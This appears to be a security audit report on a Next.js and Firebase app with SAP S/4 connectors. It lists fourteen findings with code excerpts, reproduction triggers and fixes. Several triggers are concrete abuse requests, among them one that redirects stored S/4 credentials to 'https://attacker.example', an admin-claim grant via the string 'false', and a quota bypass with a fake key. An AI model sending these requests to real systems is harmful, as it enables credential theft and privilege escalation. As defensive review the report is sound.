## High

**1. `reserveRunQuota` wipes prior fingerprints (quota idempotency is wrong)**  
`lib/firebase-admin.ts` — `reserveRunQuota` transaction.

```ts
tx.set(ref, {
  transformationsUsed: FieldValue.increment(1),
  chargedInputs: { [inputHash]: true },  // shallow merge replaces the whole map
  ...
}, { merge: true });
```

Firestore `set(..., { merge: true })` is shallow: `chargedInputs` becomes a one-key map. After a second distinct source, re-analysing the first is charged again. Refund already uses the dotted path (`chargedInputs.${inputHash}`) — reserve does not.  
Trigger: two `POST /api/runs/create` with different `legacyCode`, then a third with the first source. Breaks the “re-analysis is free” metering the route comments treat as product truth. Fix: `tx.update({ [`chargedInputs.${inputHash}`]: true, transformationsUsed: FieldValue.increment(1), ... })`.

**2. Fake BYOK disables community quota; `/api/runs/create` never uses the key**  
`lib/firebase-admin.ts` (`saveGeminiApiKey` / `reserveRunQuota`) + `app/api/secrets/gemini/route.ts` + `app/api/runs/create/route.ts`.

Any non-empty string sets `byokConfigured: true`. Quota then returns `{ charged: false, reason: 'byok' }`. Runs are minted from client `analysis` + local evidence — Gemini is not called.  
Trigger: approved user `POST /api/secrets/gemini` `{ "apiKey": "x" }`, then unlimited `POST /api/runs/create`. Marketing/Terms metering (“5 transformations”) does not hold.

**3. Stored S/4 secrets are sent to a caller-controlled URL**  
Same pattern in `app/api/test-s4-connection/route.ts`, `fetch-odata-metadata`, `fetch-s4-metadata`, `test-s4-odata-read`.

```ts
url: body.url ?? stored?.url,
password: body.password ?? stored?.password,
```

`useStoredCredentials: true` plus a different `url` keeps the vault password and fetches the body URL. `S4_HOST_ALLOWLIST` is optional; without it `isUrlSafe` allows any public HTTPS host.  
Trigger: user has saved creds; `POST /api/test-s4-connection` `{ "useStoredCredentials": true, "url": "https://attacker.example" }` (XSS or stolen Bearer). Fix: when loading stored creds, ignore body `url` / `tokenUrl` / `btpDestinationJson` (or require them to match storage).

**4. Public pack verify returns `valid: false` on rate-limit (and other errors)**  
`app/api/export/verify/route.ts` (same `statusCode` bug in `app/api/audit-pack/create/route.ts`).

`QuotaError` exposes `.status`, not `.statusCode`. The 429 branch never hits. The outer catch then returns **HTTP 200** `{ valid: false, error: 'Verification failed.' }`.  
Trigger: 31st `POST /api/export/verify` in 60s from the same IP, or any thrown error after the HMAC. An auditor treats a good signature as forged. `audit-pack/create` turns the same miss into 500 instead of 429.

**5. HMAC-signed worklist is not server-authoritative**  
`app/api/runs/create/route.ts` copies `analysis.gaps` (client JSON) into `initialWorklist`, which is inside `unsignedRunPayload` and therefore inside `runHash`/`signature`.

`app/api/audit-pack/create/route.ts`:

```ts
worklist: projectData.worklist || runData.worklist,
```

`worklist` is client-writable (`firestore.rules` project update allowlist). The pack HMAC-signs that view; ADR/`generateArchitectureDecisionRecord` presents it as evidence. Provenance does not mark worklist as user-attested.  
Trigger: `POST /api/runs/create` with `analysis: { gaps: [{ title: "…", severity: "High", … }] }`; or after a real run, client `update` of `projects/{id}.worklist` then `POST /api/audit-pack/create`.

**6. Trust-chain minting ignores MFA**  
`app/api/runs/create/route.ts`, `app/api/audit-pack/create/route.ts` (also `DELETE app/api/projects/[projectId]/route.ts`).

`assertMfaSatisfied` is applied to Gemini, S/4, secrets, tests — not to run/pack minting.  
Trigger: `mfaEnabled: true`, valid Bearer, **no** `mfa_session` cookie → signed run + signed ZIP still succeed. Stolen ID token is enough to mint the audit chain.

**7. S/4 “connected” on 401/403**  
`app/api/test-s4-connection/route.ts` — `evaluateHttpStatus`.

```ts
} else if (httpStatus === 401 || httpStatus === 403) {
  return NextResponse.json({ status: 'connected', ... });
```

Trigger: reachable host, wrong password. Any UI/automation that keys on `status === 'connected'` reports a live tenant with rejected credentials.

## Medium

**8. `/api/fetch-s4-metadata` does not constrain `servicePath`**  
`app/api/fetch-s4-metadata/route.ts` (~servicePath default + concat). Sibling `test-s4-odata-read` already rejects `..`, `%2e`, non-`/sap/opu/odata/…` paths. Here `servicePath` is concatenated onto the allowlisted host and fetched via `safeFetch`.  
Trigger: `{ "servicePath": "/sap/bc/any/path" }` (or any path the tenant credentials can read). Same-host arbitrary GET with stored or body creds.

**9. `isAdmin !== false` treats any non-boolean as grant**  
`app/api/admin/set-admin-claim/route.ts`.

```ts
const grant = isAdmin !== false; // default: grant
```

Trigger: `{ "uid": "<id>", "isAdmin": "false" }` or `"0"` → **grants** `admin` claim. Also: this path never calls `logAuditEvent` (unlike `console-action`).

**10. Client can write Terms acceptance on user create**  
`firestore.rules` `userClientCreateKeys` includes `termsVersionAccepted` / `termsAcceptedAt`; create does not bind them to `TERMS_VERSION` or a server timestamp.

`assertAccountActive` only fails when a *non-null* accepted version is stale; `/api/consent` is skippable.  
Trigger: first `users/{uid}` create with `termsVersionAccepted` set to the current version — no `consent_events` row.

**11. Live test sandbox gets S/4 password in the child environment**  
`app/api/run-tests/route.ts` when `s4Environment === 'live'` and `S4_TEST_RUNNER_EGRESS_ENFORCED === 'true'`.

Untrusted generated tests run with `S4_PASSWORD` in `process.env`; stdout/stderr are returned to the client. Net guard is explicitly disabled in that mode. Generated code can print or (once egress is opened to the tenant) send the vault secret. Do not put decryptable secrets in the sandbox env.

**12. `NEXT_PUBLIC_USE_FIREBASE_EMULATOR === 'true'` is a production kill switch**  
If that public flag is set on a deploy that is not Cloud Run (`K_SERVICE` unset): rate limits off (`lib/rate-limit.ts`), Node permission sandbox off (`run-tests`), admin MFA enrollment skipped (`assertAdminStepUp`), `verifyAdminRequest` falls back to `users.isAdmin`, and `/api/test/seed` only needs `PILOT_APPROVAL_SECRET`. Confirm against actual hosting env; Gate 1 on the seed route only holds on Cloud Run.

**13. Jira callback reports success without storing tokens**  
`app/api/auth/jira/callback/route.ts` — after a 200 token exchange, persistence is `TODO` and the page still `postMessage`s `JIRA_AUTH_SUCCESS`.  
Trigger: `JIRA_INTEGRATION_ENABLED=true`. UI can claim a connected Jira that the server does not have.

## Low

**14. Audit-pack export timestamp never lands on `auditMetadata`**  
`app/api/audit-pack/create/route.ts`:

```ts
.set({ 'auditMetadata.auditPackExportedAt': generatedAt }, { merge: true })
```

Admin `set`+merge does not interpret dotted paths (`update` does). Writes a literal top-level field; `auditMetadata.auditPackExportedAt` stays unset.
